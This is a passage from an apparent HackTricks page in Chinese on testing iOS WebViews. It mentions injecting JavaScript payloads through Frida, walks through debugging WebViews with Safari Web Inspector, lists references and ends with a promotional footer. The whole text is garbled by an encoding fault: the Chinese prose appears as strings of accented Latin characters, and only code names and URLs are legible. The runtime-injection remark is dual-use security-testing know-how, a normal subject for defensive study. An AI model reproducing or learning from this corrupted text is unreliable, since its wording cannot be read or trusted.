* æ‰§è¡ŒåŠ¨æ€å·¥å…·æ³¨å…¥å¹¶ä½¿ç”¨åƒ Frida è¿™æ ·çš„æ¡†æ¶é€šè¿‡ iOS WebViews æä¾›çš„ç›¸åº” JavaScript è¯„ä¼°å‡½æ•°æ³¨å…¥ JavaScript è´Ÿè½½ï¼ˆå¯¹äº `UIWebView` æ˜¯ [`stringByEvaluatingJavaScriptFromString:`](https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc)ï¼Œå¯¹äº `WKWebView` æ˜¯ [`evaluateJavaScript:completionHandler:`](https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc)ï¼‰ã€‚

## è°ƒè¯• iOS WebViews

ï¼ˆæ•™ç¨‹æ¥è‡ª [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews)ï¼‰

åœ¨ iOS webviews ä¸­ï¼Œä¼ é€’ç»™ `console.log()` çš„æ¶ˆæ¯ä¸ä¼šæ‰“å°åˆ° Xcode æ—¥å¿—ä¸­ã€‚ä½¿ç”¨ Safari çš„å¼€å‘è€…å·¥å…·è°ƒè¯• web å†…å®¹ä»ç„¶ç›¸å¯¹å®¹æ˜“ï¼Œå°½ç®¡æœ‰ä¸€äº›é™åˆ¶ï¼š

* è°ƒè¯• iOS webviews éœ€è¦ä½¿ç”¨ Safariï¼Œå› æ­¤æ‚¨çš„å¼€å‘è®¡ç®—æœºå¿…é¡»è¿è¡Œ macOSã€‚
* æ‚¨åªèƒ½åœ¨é€šè¿‡ Xcode åŠ è½½åˆ°æ‚¨è®¾å¤‡ä¸Šçš„åº”ç”¨ç¨‹åºä¸­è°ƒè¯• webviewsã€‚æ‚¨æ— æ³•è°ƒè¯•é€šè¿‡ App Store æˆ– Apple Configurator å®‰è£…çš„åº”ç”¨ç¨‹åºä¸­çš„ webviewsã€‚

è€ƒè™‘åˆ°è¿™äº›é™åˆ¶ï¼Œä»¥ä¸‹æ˜¯åœ¨ iOS ä¸­è¿œç¨‹è°ƒè¯• webview çš„æ­¥éª¤ï¼š

* é¦–å…ˆï¼Œåœ¨æ‚¨çš„ iOS è®¾å¤‡ä¸Šå¯ç”¨ Safari Web æ£€æŸ¥å™¨ï¼Œæ‰“å¼€ iOS _è®¾ç½®_ åº”ç”¨ï¼Œå¯¼èˆªåˆ° **è®¾ç½® > Safari > é«˜çº§**ï¼Œç„¶åæ‰“å¼€ _Web æ£€æŸ¥å™¨_ é€‰é¡¹ã€‚

![iOS Safari è®¾ç½®](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/ios-safari-settings.jpg)

* æ¥ä¸‹æ¥ï¼Œæ‚¨è¿˜å¿…é¡»åœ¨å¼€å‘è®¡ç®—æœºä¸Šçš„ Safari ä¸­å¯ç”¨å¼€å‘è€…å·¥å…·ã€‚åœ¨æ‚¨çš„å¼€å‘æœºå™¨ä¸Šå¯åŠ¨ Safari å¹¶å¯¼èˆªåˆ°èœå•æ ä¸­çš„ **Safari > åå¥½è®¾ç½®**ã€‚åœ¨å‡ºç°çš„åå¥½è®¾ç½®é¢æ¿ä¸­ï¼Œç‚¹å‡» _é«˜çº§_ æ ‡ç­¾ï¼Œç„¶ååœ¨åº•éƒ¨å¯ç”¨ _æ˜¾ç¤ºå¼€å‘èœå•_ é€‰é¡¹ã€‚å®Œæˆåï¼Œæ‚¨å¯ä»¥å…³é—­åå¥½è®¾ç½®é¢æ¿ã€‚

![Mac Safari è®¾ç½®](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-settings.jpg)

* å°†æ‚¨çš„ iOS è®¾å¤‡è¿æ¥åˆ°å¼€å‘è®¡ç®—æœºå¹¶å¯åŠ¨æ‚¨çš„åº”ç”¨ç¨‹åºã€‚
* åœ¨å¼€å‘è®¡ç®—æœºä¸Šçš„ Safari ä¸­ï¼Œç‚¹å‡»èœå•æ ä¸­çš„ _å¼€å‘_ï¼Œç„¶åæ‚¬åœåœ¨æ‚¨çš„ iOS è®¾å¤‡åç§°çš„ä¸‹æ‹‰é€‰é¡¹ä¸Šï¼Œä»¥æ˜¾ç¤ºåœ¨æ‚¨çš„ iOS è®¾å¤‡ä¸Šè¿è¡Œçš„ webview å®ä¾‹åˆ—è¡¨ã€‚

![Mac Safari å¼€å‘èœå•](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-develop-menu.jpg)

* ç‚¹å‡»æ‚¨å¸Œæœ›è°ƒè¯•çš„ webview çš„ä¸‹æ‹‰é€‰é¡¹ã€‚è¿™å°†æ‰“å¼€ä¸€ä¸ªæ–°çš„ Safari Web æ£€æŸ¥å™¨çª—å£ä»¥æ£€æŸ¥ webviewã€‚

![Safari Web æ£€æŸ¥å™¨çª—å£](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-inspector.jpg)

## å‚è€ƒèµ„æ–™

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
